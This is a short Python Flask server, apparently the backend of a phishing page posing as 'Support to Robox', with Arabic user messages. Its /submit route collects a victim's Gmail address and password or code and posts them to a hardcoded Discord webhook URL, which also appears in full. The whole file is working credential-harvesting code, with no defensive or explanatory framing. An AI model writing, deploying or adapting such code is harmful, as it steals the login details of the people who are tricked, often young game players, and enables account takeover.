from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__, template_folder='.', static_folder='.')

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1573352278713303052/1CJuJ0LpyAKOAxxLRhz_gMqrCbmtBc2p5Vvcakur5_cW4l7dLKd3aWjJOqwlzPuzUgwz"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json(silent=True) or request.form
    email = data.get('email') or data.get('gmail') or ''
    password = data.get('password') or data.get('code') or data.get('pass') or ''

    if not email or not password:
        return jsonify({'status': 'error', 'message': 'يرجى إدخال جميع البيانات'}), 400

    payload = {
        "embeds": [
            {
                "title": "🔔 بيانات جديدة - Support to Robox",
                "color": 5814783,
                "fields": [
                    {"name": "📧 Gmail", "value": f"`{email}`", "inline": False},
                    {"name": "🔑 الرمز", "value": f"`{password}`", "inline": False}
                ]
            }
        ]
    }

    try:
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=10)
        if response.status_code in (200, 204):
            return jsonify({'status': 'success', 'message': 'تم الإرسال بنجاح'})
        else:
            return jsonify({'status': 'error', 'message': f'تعذر الاتصال بالديسكورد ({response.status_code})'}), 500
    except Exception:
        return jsonify({'status': 'error', 'message': 'تعذر الاتصال بالديسكورد، حاول لاحقاً'}), 500

if __name__ == '__main__':
    app.run(debug=True)
